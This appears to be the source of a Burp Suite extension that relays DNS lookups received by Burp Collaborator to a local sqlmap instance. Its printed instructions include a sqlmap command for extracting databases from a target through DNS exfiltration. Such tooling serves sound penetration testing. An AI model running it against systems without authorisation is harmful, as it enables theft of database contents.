package burp;

import java.net.*;
import java.io.*;
import java.util.Map;
import java.util.Base64;

public class BurpExtender implements IBurpExtender
{
    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks)
    {
        callbacks.setExtensionName("SqlmapDnsCollaborator");

        IBurpCollaboratorClientContext collaborator = callbacks.createBurpCollaboratorClientContext();
        String pollPayload = collaborator.generatePayload(true);

        callbacks.printOutput("******************************************************************************************************************************************************");
        callbacks.printOutput("** Run Sqlmap with all the parameters you want and add the following one: --dns-domain="+pollPayload);
        callbacks.printOutput("** EXAMPLE: sqlmap.py -u \"https://yourvulnerabletarget.com\" --dbs --dns-domain="+pollPayload);
        callbacks.printOutput("** After you are done exfiltrating data via DNS, unload this Burp Extension.");
        callbacks.printOutput("** Reload it whenever you want to use it again.");
        callbacks.printOutput("******************************************************************************************************************************************************");
        

        try {
            while (true) {
                Thread.sleep(500);
                for (IBurpCollaboratorInteraction interaction: collaborator.fetchCollaboratorInteractionsFor(pollPayload)) {
                    callbacks.printOutput("========== COLLABORATOR INTERACTION ==========");
                    for (Map.Entry<String, String> entry : interaction.getProperties().entrySet()) {
                        String k = entry.getKey();
                        String v = entry.getValue();
                        callbacks.printOutput("Property: " + k);
                        callbacks.printOutput("\tValue: " + v);
                    }
                    if (interaction.getProperty("type").equals("DNS")) {
                        try {
                            String raw_query = interaction.getProperty("raw_query");
                            byte[] raw_query_bytes = Base64.getDecoder().decode(raw_query.getBytes());

                            InetAddress address = InetAddress.getByName("127.0.0.1");
                            DatagramSocket socket = new DatagramSocket();                             
                            DatagramPacket request = new DatagramPacket(raw_query_bytes, raw_query_bytes.length, address, 53);
                            socket.send(request);
                        }
                        catch (UnknownHostException unknownHostException) {}
                        catch (IOException iOException) {}
                    }
                }
            }
        }
        catch (InterruptedException interruptedException) {}
        
    }
}
